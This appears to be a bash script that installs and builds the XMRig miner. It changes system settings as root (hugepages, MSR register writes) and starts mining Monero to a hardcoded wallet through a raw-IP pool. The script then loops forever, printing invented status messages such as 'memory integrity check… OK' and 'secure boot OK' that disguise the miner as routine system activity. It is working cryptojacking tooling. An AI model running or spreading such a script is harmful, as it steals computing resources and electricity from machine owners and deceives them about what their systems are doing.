 
WALLET="44Dzqvm7mx3LTETpwC5xRDQQs9Mn3Y1ZSV3YkJdQSDUaTo7xXMirqtnUu3ZtoYky2CE4gMJDKJPivUSRvNAvqBawJ8agMuU"
POOL="153.92.5.32:2222" 
WORKER="${1:-FastRig}" 

REQUIRED_PACKAGES=(
  git
  build-essential
  cmake
  automake
  libtool
  autoconf
  libhwloc-dev
  libuv1-dev
  libssl-dev
  msr-tools
  curl
)

apt-get update -y

for pkg in "${REQUIRED_PACKAGES[@]}"; do
  if dpkg -s "$pkg" &>/dev/null; then
    echo "    • $pkg already installed"
  else
    echo "    • Installing $pkg"
    apt-get install -y "$pkg"
  fi
done

sysctl -w vm.nr_hugepages=128
echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf

echo "[+] Loading module…"
modprobe msr 2>/dev/null

if ! command -v wrmsr &>/dev/null; then
  echo "[ERROR] wrmsr not found even after installing msr-tools. Aborting."
fi

wrmsr -a 0x1a4 0xf 2>/dev/null

echo "[+] Cloning ..."
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build

echo "[+] Building ..."
cmake ..
make -j$(nproc)

echo "[+] starting in 2 seconds..."
sleep 2

./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero

while true; do
  echo "[INFO] Initializing module: net.core"
  sleep 2

  echo "[INFO] Syncing core clock with NTP server…"
  sleep 2

  echo "[INFO] Performing memory integrity check… OK"
  sleep 2

  RANDOM_PID=$(( RANDOM % 9000 + 1000 ))
  echo "[INFO] Task scheduler running: PID $RANDOM_PID"
  sleep 4

  echo "[INFO] Kernel modules verified: secure boot OK"
  sleep 2

  RANDOM_LATENCY=$(( RANDOM % 30 + 1 ))
  echo "[INFO] Network latency: ${RANDOM_LATENCY}ms"
  sleep 2
done